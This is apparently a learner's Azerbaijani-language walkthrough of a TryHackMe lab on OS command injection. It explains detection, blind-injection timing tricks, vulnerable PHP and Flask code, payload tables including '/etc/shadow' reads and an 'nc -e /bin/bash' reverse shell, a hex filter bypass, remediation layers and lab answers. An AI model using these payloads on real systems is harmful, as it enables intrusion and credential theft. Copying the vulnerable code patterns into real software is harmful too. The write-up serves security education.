# 💉 TryHackMe — Command Injection | Azərbaycan dilində Öyrənmə Yazısı

> **Mənbə:** [TryHackMe | Command Injection](https://tryhackme.com/room/oscommandinjection)
> **Çətinlik:** Easy | **Müddət:** ~20 dəq
> **Məqsəd:** Command injection-i anlamaq, aşkar etmək, istismar etmək və qarşısını almaq.

---

## 📋 Mündəricat

1. [Task 1 — Giriş: Command Injection nədir?](#task-1--giriş)
2. [Task 2 — Command Injection-i Aşkar Etmək](#task-2--command-injection-i-aşkar-etmək)
3. [Task 3 — Command Injection-i İstismar Etmək](#task-3--command-injection-i-istismar-etmək)
4. [Task 4 — Praktiki](#task-4--praktiki)
5. [Task 5 — Remediation (Qorunma)](#task-5--remediation-qorunma)
6. [Task 6 — Nəticə](#task-6--nəticə)
7. [Sual-Cavab Cədvəli](#sual-cavab-cədvəli)

---

## Task 1 — Giriş

### Command Injection nədir?

Veb tətbiqlər çox vaxt işini görərkən əməliyyat sisteminə əmrlər verir. Məsələn, bir sayt istifadəçinin daxil etdiyi IP-ni `ping` edə bilər. Bu əmr serverın özündə icra olunur.

**Problem:** Əgər developer istifadəçidən gələn məlumatı **heç yoxlamadan** birbaşa sistem əmrinə əlavə edirsə, hacker öz əmrlərini yeridə bilər.

```
Normal axın:
İstifadəçi → [məlumat] → Sistem əmri → Nəticə

Hücum axını:
İstifadəçi → [məlumat; öz əmri] → Sistem əmri + Hacker əmri → Həssas nəticə
```

### Vacib terminlər

| Termin | İzah |
|---|---|
| **Command Injection** | İstifadəçinin sistem əmri yeritməsi |
| **RCE (Remote Code Execution)** | Uzaqdan kod icra etmək — daha geniş anlayış |
| **CWE-78** | Bu zəifliyin rəsmi kodu |
| **OWASP Top 10:2025 — A05** | Injection kateqoriyasına daxildir |

> **Fərq:** Command Injection, RCE-yə nail olmağın **bir üsulu**dur. RCE-yə başqa üsullarla da (məsələn, insecure deserialization) çatmaq olar.

### İcazə məsələsi

Yeridirilən əmrlər **tətbiqin işlədiyi istifadəçinin səlahiyyətləri ilə** icra olunur:

```
Veb server  →  "www-data" kimi işləyir
Hacker əmri →  "www-data" kimi icra olunur
```

Əgər server `root` ilə işləyirsə — hacker tam sistemi ələ keçirə bilər. 💀

### Sual-Cavab

> **Sual:** Növbəti task-a keç.
> **Cavab:** *(sadəcə "Completed" işarələ)*

---

## Task 2 — Command Injection-i Aşkar Etmək

### Haradan başlamaq?

İstifadəçi inputu qəbul edən **hər sahə** potensial hədəfdir. Xüsusilə:
- Axtarış sahələri
- Ping / traceroute alətləri
- Fayl adı daxil etmə sahələri
- URL parametrləri

### Shell Operatorları — Silah sandığı

| Operator | Necə işləyir |
|---|---|
| `;` | Birinci uğursuz olsa belə ikincini icra edir |
| `&` | Hər ikisini eyni anda arxa planda işlədir |
| `&&` | Yalnız birinci uğurlu olarsa ikincini icra edir |
| `\|` | Birincinin çıxışını ikinciyə ötürür |

---

### İki növ Command Injection var

#### 🔊 Verbose (Açıq) Command Injection

Yeritdiyin əmrin **nəticəsi birbaşa səhifədə görünür.**

```
Sahəyə daxil et:  ; whoami
Səhifədə görünür: www-data
```

Çox asandır — nəticəni dərhal görürsən.

---

#### 🙈 Blind (Kor) Command Injection

Əmr serverdə icra olunur, **amma səhifədə heç nə dəyişmir.**

3 üsulla sübut edilir:

---

**Üsul 1 — Vaxt Gecikmesi (Ən etibarlı)**

```bash
; ping -c 10 127.0.0.1
```

- Server özünə 10 dəfə ping atır
- Cavab **~10 saniyə** gecikir
- Gecikmə sayı ilə mütənasibdirsə → **injection işləyir ✅**

```bash
; sleep 10    # ping quraşdırılmayıbsa alternativ
```

---

**Üsul 2 — Nəticəni Fayla Yaz**

```bash
; whoami > /var/www/html/output.txt
```

Sonra brauzerdə aç:
```
http://hədəf.com/output.txt
```

Faylda `www-data` görünsə → **injection işlədi ✅**

`>` operatoru əmrin nəticəsini fayla yönləndirir.

---

**Üsul 3 — curl ilə Test**

```bash
curl "http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami"
```

Bu URL-in açılımı:
```
process.php?search=The Beatles; whoami
```

Cavabda `whoami` nəticəsi görünsə → **həssasdır ✅**

---

### PHP Nümunəsi — Zəiflik necə yaranır?

```php
<?php
$songs = "/var/www/html/songs";

if (isset($_GET["title"])) {
    $title = $_GET["title"];                          // ← İstifadəçidən alır
    $command = "grep $title /var/www/html/songtitle.txt";  // ← Birbaşa əlavə edir!
    $search = exec($command);                         // ← İcra edir
}
?>
```

**Normal istifadə:**
```
URL: ?title=Yesterday
Əmr: grep Yesterday /var/www/html/songtitle.txt  ✅
```

**Hücum:**
```
URL: ?title=; cat /etc/passwd
Əmr: grep ; cat /etc/passwd /var/www/html/songtitle.txt

→ Əmr 1: grep  (uğursuz, amma problem deyil)
→ Əmr 2: cat /etc/passwd  (həssas fayl açılır!) 💀
```

---

### Python Nümunəsi — Daha Ekstremal

```python
from flask import Flask
import subprocess

app = Flask(__name__)

@app.route('/<shell>')
def command_server(shell):
    return subprocess.Popen(shell, shell=True,
                            stdout=subprocess.PIPE).stdout.read()
```

URL-dəki hər şey birbaşa sistem əmri olur:

```
http://sayt.com/whoami      → whoami icra edilir
http://sayt.com/id          → id icra edilir
http://sayt.com/ls          → ls icra edilir
```

Bu, praktikdə **veb-saytın içinə terminal qoymaqdır.**

### Sual-Cavab

| Sual | Cavab |
|---|---|
| PHP kodunda istifadəçi məlumatı hansı HTTP metodu ilə alınır? | `GET` |
| Python kodunda `id` əmrini icra etmək üçün hansı route lazımdır? | `/id` |

---

## Task 3 — Command Injection-i İstismar Etmək

### Faydalı Payload-lar

#### 🐧 Linux üçün

| Payload | Nə öyrədirsən? |
|---|---|
| `whoami` | Server hansı istifadəçi ilə işləyir? |
| `id` | İstifadəçi ID-si və qrup məlumatları |
| `ls` | Cari qovluqdakı fayllar (konfiq, API açarları...) |
| `cat /etc/passwd` | Sistem istifadəçiləri siyahısı |
| `cat /etc/shadow` | Şifrə hashları (əgər icazə varsa) |
| `uname -a` | Kernel və OS versiyası |
| `pwd` | Cari qovluq yolu |
| `ping -c N 127.0.0.1` | Blind injection testi — vaxt gecikmesi |
| `sleep N` | Alternativ vaxt gecikmesi testi |
| `nc -e /bin/bash IP PORT` | Reverse shell — interaktiv giriş |

#### 🪟 Windows üçün

| Payload | Nə öyrədirsən? |
|---|---|
| `whoami` | Cari istifadəçi |
| `dir` | Qovluq içinə bax (Linux `ls`-in qarşılığı) |
| `ipconfig` | Şəbəkə konfiqurasiyası |
| `ping -n N 127.0.0.1` | Vaxt gecikmesi testi |
| `timeout N` | `ping` yoxdursa alternativ |

### İstismar axını

```
1. Sahəni tap          →  Input alan hər yer
        ↓
2. Verbose yoxla       →  ; whoami → Nəticə görünürsə BINGO
        ↓
3. Blind yoxla         →  ; sleep 10 → Gecikmə varsa BINGO
        ↓
4. Sistemi kəşf et     →  whoami, id, ls, uname -a
        ↓
5. Həssas data tap     →  cat /etc/passwd, ls /home, env
        ↓
6. Genişlən            →  Reverse shell, privilege escalation
```

---

## Task 4 — Praktiki

### Ssenari

Həssas bir veb tətbiq var. Məqsəd: command injection vasitəsilə sisteme daxil olub **flag faylını tapmaq.**

### Ümumi addımlar

**Addım 1 — Verbose yoxla:**
```
Input sahəsinə daxil et: ; whoami
```
Nəticə görünürsə — verbose injection var.

**Addım 2 — Sistemi kəşf et:**
```bash
; ls /          # Kök qovluğa bax
; ls /home      # İstifadəçi qovluqları
; find / -name "flag*" 2>/dev/null   # Flag faylını axtar
```

**Addım 3 — Flag-ı oxu:**
```bash
; cat /path/to/flag.txt
```

> **Qeyd:** Flag formatı adətən `THM{...}` şəklindədir.

---

## Task 5 — Remediation (Qorunma)

### 3 Qat Müdafiə

---

#### Qat 1 — Client-Side Validation (Zəif, amma kömək edir)

```html
<input type="text" name="ping" pattern="[0-9]+">
```

Forma **yalnız rəqəmlərə** icazə verir. Amma hacker brauzer işlətmədən `curl` ilə yan keçə bilər:

```bash
curl "http://sayt.com/ping.php?ping=;whoami"
```

**Tək başına kifayət deyil!**

---

#### Qat 2 — Server-Side Sanitisation (Əsas müdafiə)

```php
<?php
if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {
    // Rəqəm deyilsə — dayandır, heç nə etmə!
}
?>
```

Server özü yoxlayır. `curl` ilə də yan keçilə bilməz.

Süzülməli simvollar:

| Simvol | Niyə təhlükəlidir? |
|---|---|
| `;` | Əmrləri ardıcıl icra edir |
| `&` `&&` | Əmrləri paralel/şərtli icra edir |
| `>` `>>` | Nəticəni fayla yönləndirir |
| `/` `\` | Fayl yolları üçün |
| `"` `'` `` ` `` | String manipulyasiyası |

---

#### Qat 3 — Hex Encoding Hücumunu Anlamaq

Hacker filter-i yan keçmək üçün eyni mətni **hexadecimal** formatda yaza bilər:

```
Normal:  /etc/passwd
Hex:     \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64
```

```
Filter görür:  \x2f\x65\x74\x63...  → "Mətn deyil, keç" ✅
OS oxuyur:     /etc/passwd           → Faylı açır! 💀
```

Buna görə **çox qatlı müdafiə** (Defence in Depth) lazımdır.

---

### Defence in Depth — Tam Mənzərə

```
┌──────────────────────────────────────────┐
│  1. HTML Pattern Validation              │  ← Brauzer tərəfi
├──────────────────────────────────────────┤
│  2. Server-side Input Sanitisation       │  ← Server tərəfi (əsas)
├──────────────────────────────────────────┤
│  3. Allowlist (yalnız icazəli formatlar) │  ← Ən güclü süzgəc
├──────────────────────────────────────────┤
│  4. Least Privilege (ən az icazə)        │  ← Zərəri məhdudlaşdır
└──────────────────────────────────────────┘
```

**Least Privilege:** Server `www-data` kimi məhdud icazə ilə işləsə, hacker da yalnız `www-data` səlahiyyəti əldə edir — tam sistem deyil.

### Sual-Cavab

| Sual | Cavab |
|---|---|
| Client-side filterlər niyə kifayətsizdir? | `curl` kimi alətlərlə yan keçilə bilər |
| `/etc/passwd` üçün hex encoding nədir? | `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64` |

---

## Task 6 — Nəticə

### Öyrəndiklərimiz

```
Command Injection
├── Nə baş verir?
│   └── İstifadəçi inputu yoxlanılmadan sistem əmrinə əlavə edilir
│
├── Növləri
│   ├── Verbose → Nəticə ekranda görünür (asan)
│   └── Blind   → Nəticə görünmür (vaxt/fayl üsulları lazım)
│
├── Aşkarlama üsulları
│   ├── ; whoami  → Verbose test
│   ├── ; sleep 10 → Blind test (vaxt gecikmesi)
│   └── ; whoami > /var/www/html/out.txt → Fayla yaz
│
├── Faydalı payload-lar
│   ├── Linux: whoami, id, ls, cat, uname -a, nc
│   └── Windows: whoami, dir, ipconfig, ping, timeout
│
└── Qorunma
    ├── Client-side validation (zəif)
    ├── Server-side sanitisation (güclü)
    ├── Allowlist (ən güclü)
    └── Least Privilege (zərəri azaldır)
```

### OWASP konteksti

- **OWASP Top 10:2025 → A05: Injection**
- **CWE-78** — OS Command Injection üçün rəsmi identifikator
- Injection kateqoriyası hələ də ən çox test edilən zəiflik siniflərindən biridir

---

## 📊 Sual-Cavab Cədvəli (Bütün Task-lar)

| Task | Sual | Cavab |
|---|---|---|
| Task 1 | Lab-a davam et | *(Completed işarələ)* |
| Task 2 | PHP kodunda hansı HTTP metodu istifadə olunur? | `GET` |
| Task 2 | Python kodunda `id` əmri üçün hansı route? | `/id` |
| Task 3 | Blind injection üçün hansı Linux əmri vaxt gecikmesi yaradır? | `ping` / `sleep` |
| Task 4 | Flag | `THM{...}` *(labdan alınır)* |
| Task 5 | Client-side filterlər niyə kifayətsizdir? | Birbaşa HTTP sorğusu ilə yan keçilir |

---

## 🔗 Növbəti Addım

Bu labı bitirdikdən sonra tövsiyə olunan yollar:

- 🌐 [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) — Shell operatorlarını dərindən öyrən
- 🌐 [Web Fundamentals](https://tryhackme.com/path/outline/web) — Veb tətbiq zəifliklərini araşdır
- 🌐 [OWASP Top 10](https://tryhackme.com/room/owasptop102021) — Digər kritik zəifliklər

---

*Hazırladı: Azərbaycan dilində TryHackMe öyrənmə yazısı*
*Mənbə: [TryHackMe — Command Injection](https://tryhackme.com/room/oscommandinjection)*
